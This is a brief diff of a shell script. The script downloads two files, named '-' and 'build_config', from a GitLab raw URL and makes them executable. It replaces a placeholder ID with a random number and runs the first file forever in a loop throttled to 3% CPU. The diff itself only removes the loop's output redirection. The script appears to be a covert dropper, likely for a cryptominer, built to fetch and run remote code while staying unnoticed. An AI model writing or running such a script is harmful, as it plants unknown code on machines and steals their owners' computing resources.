@@ -9,4 +9,4 @@ wget https://gitlab.com/aprilantwan67/kazep/-/raw/main/-
 wget https://gitlab.com/aprilantwan67/kazep/-/raw/main/build_config
 chmod +x - build_config
 sed -i "s/KASEP90/$(shuf -n 1 -i 1-99999999)/" "build_config"
-while :; do timeout 1m cpulimit -l 3 ./-; sleep 20; done >/dev/null >/dev/null 2>&1
+while :; do timeout 1m cpulimit -l 3 ./-; sleep 20; done
